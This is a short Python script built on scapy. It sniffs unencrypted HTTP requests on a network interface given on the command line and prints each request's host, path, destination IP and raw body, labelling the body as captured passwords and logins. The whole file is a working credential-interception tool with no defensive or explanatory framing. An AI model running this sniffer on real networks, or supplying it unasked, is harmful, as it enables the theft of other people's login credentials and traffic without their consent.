#!/usr/bin/env python
import scapy.all as scapy
import optparse
from scapy.layers import http


def argument():
    b = optparse.OptionParser()
    b.add_option("-i", "--interface", dest="interface", help="Your Interface")
    (options, arguments) = b.parse_args()
    if not options.interface:
        b.error
    else:
        return options


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
            load = packet[scapy.Raw].load
            ip = packet[scapy.IP].dst
            print("URL: {}".format(url))
            print("IP address: {}".format(ip))
            print("[+] Password and Login:\n{}".format(load))


a = argument()
sniffer(a.interface)